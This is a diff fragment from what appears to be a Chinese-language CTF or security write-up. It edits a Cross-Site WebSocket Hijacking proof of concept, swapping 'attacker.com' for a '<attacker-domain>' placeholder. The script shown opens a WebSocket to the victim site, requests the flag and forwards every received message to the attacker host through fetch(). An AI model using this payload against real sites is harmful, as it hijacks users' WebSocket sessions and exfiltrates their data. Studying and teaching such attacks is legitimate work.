@@ -89,12 +89,12 @@ def check_origin_check(ws_url: str):
 ```
 
 ```html
-<!-- CSWSH Exploit HTML (托管在 attacker.com) -->
+<!-- CSWSH Exploit HTML (托管在 <attacker-domain>) -->
 <script>
 var ws = new WebSocket('wss://victim.com/ws');
 ws.onmessage = function(e) {
     // 把受害者的消息发给我们
-    fetch('https://attacker.com/log?d=' + encodeURIComponent(e.data));
+    fetch('https://<attacker-domain>/log?d=' + encodeURIComponent(e.data));
 };
 ws.onopen = function() {
     ws.send(JSON.stringify({"action": "getFlag"}));
